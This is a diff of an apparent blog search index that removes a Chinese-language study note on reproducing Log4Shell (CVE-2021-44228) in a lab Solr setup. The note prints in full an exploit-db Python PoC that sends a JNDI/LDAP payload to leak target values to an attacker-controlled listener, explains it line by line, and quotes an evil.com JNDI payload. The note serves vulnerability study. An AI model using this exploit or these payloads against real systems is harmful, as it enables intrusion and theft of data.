@@ -1,301 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>漏洞学习</title>
-    <url>/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<p><strong><code>想把一些常见的CVE以及一些经典漏洞复现，做做笔记</code></strong></p>
-<h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Apache</span> Log4j2 是一个被广泛使用的开源日志记录库，<span class="number">2017</span> 年 <span class="number">7</span> 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 <span class="number">2</span>.<span class="number">0</span>-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 <span class="number">2021</span> 年 <span class="number">11</span> 月 <span class="number">24</span> 日向 Apache 报告了该漏洞；<span class="number">12</span> 月 <span class="number">5</span> 日官方发布了补丁；到了 <span class="number">12</span> 月 <span class="number">9</span> 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">环境搭建虚拟机版本</span><span class="punctuation">:</span> <span class="string">ubuntu 20.4</span></span><br><span class="line"><span class="attribute">Apache solr版本</span><span class="punctuation">:</span> <span class="string">8.11.0</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Apache-solr-8-11-0下载"><a href="#Apache-solr-8-11-0下载" class="headerlink" title="Apache solr 8.11.0下载"></a>Apache solr 8.11.0下载</h3><p>这里我采用的是<code>Apache Solr</code>开源服务器</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Solr是Apache下的一个顶级开源项目，采用Java开发，它是基于Lucene的全文搜索服务器。Solr提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展，并对索引、搜索性能进行了优化。</span><br></pre></td></tr></table></figure>
-
-<p>针对漏洞修复时间<code>[12 月 5 日]</code>，和官方更新文档</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201005804892.png" alt="image-20221201005804892"></p>
-<p><code>Apache Solr 8.11.0</code>是<code>CVE-2021-44228</code>修复前的最后的一个版本</p>
-<p>所以该版本也存在<code>CVE-2021-44228</code></p>
-<p>于是下载</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>archive.apache.org<span class="regexp">/dist/</span>lucene<span class="regexp">/solr/</span><span class="number">8.11</span>.<span class="number">0</span>/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201010242171.png" alt="image-20221201010242171"></p>
-<h3 id="JAVA配置"><a href="#JAVA配置" class="headerlink" title="JAVA配置"></a>JAVA配置</h3><p>由于<code>Apache solr</code>是基于<code>Java</code>开发的项目，所以需要先下载对应版本的<code>Java</code></p>
-<p><strong>但是针对log4j2存在的版本，需要jdk1.8.0才可以复现</strong></p>
-<p>但是</p>
-<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">高版本的JDK环境中trustURLCodebase变量为false，限制了远程类的加载，导致JNDI注入利用失败，无法反弹shell</span><br><span class="line">能实现利用条件：版本≤ JDK <span class="number">6u211、7u201</span>、 <span class="number">8u191、11.0</span>.<span class="number">1</span>。</span><br><span class="line">但是过低版本的，solr运行可能会出错</span><br></pre></td></tr></table></figure>
-
-<p>所以这里从官网下载专门的<code>8u171</code></p>
-<h4 id="解压到对应目录"><a href="#解压到对应目录" class="headerlink" title="解压到对应目录"></a>解压到对应目录</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/jdk/</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221161421513.png" alt="image-20221221161421513"></p>
-<h4 id="部署并修改环境变量"><a href="#部署并修改环境变量" class="headerlink" title="部署并修改环境变量"></a>部署并修改环境变量</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi ~/.bashrc</span><br><span class="line">在文件末尾追加下面6行内容</span><br><span class="line"><span class="comment">#set oracle jdk environment</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 <span class="comment">## 这里要注意目录要换成自己解压的jdk 目录</span></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>
-
-<h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221161638879.png" alt="image-20221221161638879"></p>
-<h3 id="Solr下载"><a href="#Solr下载" class="headerlink" title="Solr下载"></a><code>Solr</code>下载</h3><p>下载<code>solr 8.11.0</code></p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> wget https://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201111930502.png" alt="image-20221201111930502"></p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112302036.png" alt="image-20221201112302036"></p>
-<p>然后就解压</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> tar xzf solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112554067-1671632324475-1.png" alt="image-20221201112554067"></p>
-<h3 id="安装-Apache-Solr服务"><a href="#安装-Apache-Solr服务" class="headerlink" title="安装 Apache Solr服务"></a>安装 <code>Apache Solr</code>服务</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> bash solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/bin/install_solr_service.sh solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112725299.png" alt="image-20221201112725299"></p>
-<p>查看服务状态</p>
-<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl status solr</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201112839632.png" alt="image-20221201112839632"></p>
-<p>发现服务已经存在</p>
-<p>启动</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/lib/</span>systemd/systemd-sysv-install enable solr</span><br><span class="line"><span class="comment">#若执行sudo systemctl enable solr会提示不是本机服务，需要按上面方式启动运行</span></span><br></pre></td></tr></table></figure>
-
-<p>因为<code>solr</code>默认运行的端口为<code>8983</code></p>
-<p>查看环境搭建的虚拟机<code>ip</code></p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201113319037.png" alt="image-20221201113319037"></p>
-<p>得到环境搭建靶机<code>ip</code>为</p>
-<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.80.131</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h3><p>浏览器访问</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220220624019.png" alt="image-20221220220624019"></p>
-<p>搭建成功</p>
-<p>内网环境中的攻击机也成功访问</p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221201115827107.png" alt="image-20221201115827107"></p>
-<p>环境搭建完毕</p>
-<h2 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h2><p>这里调用**<code>exploitdb</code>**中的对<code>Log4j2</code>利用的脚本，这是一个信息泄露的脚本</p>
-<p>发布时间: <code>12/12/2021</code></p>
-<p><code>【ps.这个脚本可能是作者上传到exp的时候空格问题，需要稍微修改一下就可以用了】</code></p>
-<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221204224323306-1671800988704-1.png" alt="image-20221204224323306"></p>
-<p>脚本内容</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span></span><br><span class="line"><span class="comment"># Date: 12/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: leonjza</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span></span><br><span class="line"><span class="comment"># Version: &lt;= 2.14.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-44228</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pure python ENV variable leak PoC for CVE-2021-44228</span></span><br><span class="line"><span class="comment"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2021 @leonjza</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j</span></span><br><span class="line"><span class="string">&lt;=2.14 information disclosure poc &#x27;</span></span><br><span class="line">                                                 <span class="string">&#x27;(ref:</span></span><br><span class="line"><span class="string">https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on</span></span><br><span class="line"><span class="string">(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;see:</span></span><br><span class="line"><span class="string">https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br><span class="line"></span><br><span class="line">    serv_thread = threading.Thread(target=server.serve_forever)</span><br><span class="line">    serv_thread.daemon = <span class="literal">True</span></span><br><span class="line">    serv_thread.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.shutdown()</span><br><span class="line">        server.server_close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()                </span><br></pre></td></tr></table></figure>
-
-<h3 id="信息泄露脚本分析"><a href="#信息泄露脚本分析" class="headerlink" title="信息泄露脚本分析"></a>信息泄露脚本分析</h3><h4 id="LDAP-HEADER"><a href="#LDAP-HEADER" class="headerlink" title="LDAP_HEADER"></a>LDAP_HEADER</h4><p>定义 <code>LDAP_HEADER</code> 常量，这是响应 <code>LDAP</code> 请求时使用的头信息</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="ThreadedTCPRequestHandler"><a href="#ThreadedTCPRequestHandler" class="headerlink" title="ThreadedTCPRequestHandler"></a>ThreadedTCPRequestHandler</h4><p>这里定义<code>ThreadedTCPRequestHandler</code> 类的 <code>handle()</code> 方法用于处理来自客户端的连接。</p>
-<p>该方法首先输出来自客户端的连接信息，然后通过调用 <code>sock.recv()</code> 和 <code>sock.sendall()</code> 方法读取客户端发送</p>
-<p>的数据，并发送响应数据</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="ThreadedTCPServer"><a href="#ThreadedTCPServer" class="headerlink" title="ThreadedTCPServer"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> 类是一个多线程 <code>TCP</code> 服务器，它继承自 <code>socketserver.ThreadingMixIn</code> 和 </p>
-<p><code>socketserver.TCPServer</code> 类。这意味着它可以同时处理多个客户端连接。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h4><p>main()函数使用模块设置命令行参数解析器argparse，然后解析命令行参数。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j&lt;=2.14 information disclosure poc &#x27;</span>                              <span class="string">&#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>下面的类似<code>-t,-lh,-lp</code>等等就是解析器设置为接受命令行参数</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span><span class="string">&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span><span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>parse_args()</code> 方法用于解析命令行参数，并将解析后的参数值存储在一个名为 <code>args</code> 的变量中</p>
-<p>例如，在执行脚本后加的命令行参数<code>--listen-port 8080</code>就转变为了<code>args.listen_port = 8080</code>，这样在后续</p>
-<p>代码调用不同参数时，可直接调用<code>arg</code>来实现</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">args = parser.parse_args()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里先创建一个基于线程的 <code>TCP</code> 服务器，并使用 <code>args.listen_host</code> 和 <code>args.listen_port</code> 来指定的主机和端</p>
-<p>口启动，并使用 <code>ThreadedTCPRequestHandler</code> 类来处理每个请求【也就是前面提到的】</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里主要是先创建一个 <code>threading.Thread</code> 对象，并将服务器的 <code>serve_forever()</code> 方法作为其目标。这个方法</p>
-<p>就是字面意思，它会一直运行，直到服务器被关闭。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread = threading.Thread(target=server.serve_forever)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>daemon</code> 属性是 <code>Python</code> 中的线程特有属性，它表示该线程是否为守护线程，如果一个线程是守护线程，</p>
-<p>那么当程序退出时，它也会被中断。</p>
-<p>而这里的被设置为<code>ture</code>，所以这意味着程序退出时，线程将被中断。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.daemon = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后就是启动线程，并延迟 <code>1</code> 秒钟，来确保服务器完全启动</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里使用 <code>try-finally</code> 语句块向服务器发送<code>payload</code>:</p>
-<p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p>
-<p>并打印服务器的响应状态码，以及响应的文本内容</p>
-<p>最后调用服务器的 <code>shutdown()</code> 和 <code>server_close()</code> 方法，以关闭服务器，即使在发送 <code>HTTP</code> 请求时发生异常也是如此。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    server.shutdown()</span><br><span class="line">    server.server_close()</span><br></pre></td></tr></table></figure>
-
-<p>这里就是一个常见的语句，如果脚本是独立执行的，则直接就调用 <code>main()</code> 函数。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()    </span><br></pre></td></tr></table></figure>
-
-<h2 id="了解漏洞描述与注入原理"><a href="#了解漏洞描述与注入原理" class="headerlink" title="了解漏洞描述与注入原理"></a><strong>了解漏洞描述与注入原理</strong></h2><p><code>Apache Log4j 2</code> 是<code>Java</code>语言的日志处理套件，使用极为广泛。在其<code>2.0</code>到<code>2.14.1</code>版本中存在一处<code>JNDI</code>注入漏</p>
-<p>洞，攻击者在可以控制日志内容的情况下，通过传入类似于</p>
-<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>的<code>lookup</code>用于进行<code>JNDI</code>注入，执行任意代码。</p>
-<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>是<code>Log4j2</code>的一项功能，允许您<strong>在日志消息中使用动态值</strong>，<code>Log4j2</code>提供了许多内置的<code>Lookup</code>对</p>
-<p>象，用于查找不同类型的值</p>
-<p>例如<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>方法返回了系统属性<code>user.home</code>的值，并将其插入日志</p>
-<p>消息中。</p>
-<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>开始我也看不太懂<code>JNDI</code>任意代码执行语句意思</p>
-<p>先了解一下<code>JNDI</code>是什么以及其组成</p>
